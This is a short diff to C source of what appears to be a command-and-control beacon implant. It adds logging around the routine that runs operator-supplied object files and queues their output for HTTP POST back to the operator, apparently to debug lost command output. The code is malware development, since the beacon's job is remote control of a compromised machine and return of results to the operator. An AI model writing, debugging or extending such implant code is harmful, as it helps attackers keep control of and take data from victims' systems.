@@ -98,7 +98,16 @@ static BOOL use_token_a(HANDLE token) {
  * the waiting operator callback instead of the beacon console */
 static int g_obj_callback = 0;
 
+/* 2026-11-03 object-output tracing: the ipconfig result never left the
+ * beacon - log every postmsg entry + the POST queue level around the
+ * official-shape object execution (extern the queue len from the http
+ * channel) */
+extern int http_post_len;
+
 static void postmsg(int type, char * msg, int len) {
+	spawn_log("objout type=", (long)type);
+	spawn_log("objout len=", (long)len);
+	spawn_log("objout cbid=", (long)g_obj_callback);
 	if (g_obj_callback != 0) {
 		char * blob = (char *)malloc(len + 4);
 		int    id   = g_obj_callback;
@@ -1528,10 +1537,16 @@ void command_inline_execute_object(char * buffer, int length) {
 			               | ((DWORD)ar491.buffer[2] << 8)
 			               | (DWORD)ar491.buffer[3];
 
-			command_inline_execute_object_parsed(bformat_string(&rep),
-			                                     bformat_length(&rep),
-			                                     entry491, ar491.buffer,
-			                                     ar491.length, 0);
+			{
+				BOOL okrun;
+				spawn_log("cmd100 preq=", (long)http_post_len);
+				okrun = command_inline_execute_object_parsed(bformat_string(&rep),
+				                                             bformat_length(&rep),
+				                                             entry491, ar491.buffer,
+				                                             ar491.length, 0);
+				spawn_log("cmd100 parsed ret=", (long)okrun);
+				spawn_log("cmd100 postq=", (long)http_post_len);
+			}
 			g_obj_callback = 0;
 			bformat_free(&rep);
 			return;
